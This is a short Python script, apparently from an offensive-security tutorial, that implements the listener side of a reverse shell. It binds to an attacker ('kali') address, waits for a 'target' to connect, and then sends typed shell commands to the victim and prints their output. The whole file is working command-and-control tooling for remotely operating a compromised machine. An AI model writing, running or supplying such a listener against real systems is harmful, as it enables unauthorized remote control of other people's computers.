import socket
import json


kali_ip = '<server ip>'
port = 1234


def reliable_send(data):
    json_data = json.dumps(data)
    target.send(json_data.encode())


def reliable_recv():
    data = ''
    while True:
        try:
            bites_qty = 1024  # amount of bites we want to receive
            data = data + target.recv(bites_qty).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue


def target_communication():
    while True:
        command = input(f'* Shell~{ip}: ')
        reliable_send(command)
        if command == 'quit':
            break
        else:
            result = reliable_recv()
            print(result)


# socket.AF_INET implies ipv4 connection
# socket.SOCK_STREAM implies tcp connection
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.bind((kali_ip, port))

# listen for the connection
print('[+] Listening for the Incoming Connection')
different_connections = 5  # to listen up to this number of connections
sock.listen(different_connections)
target, ip = sock.accept()  # accepting incoming connection and getting target socket object and target ip
print(f'[+] Target Connected From: {ip}')
target_communication()
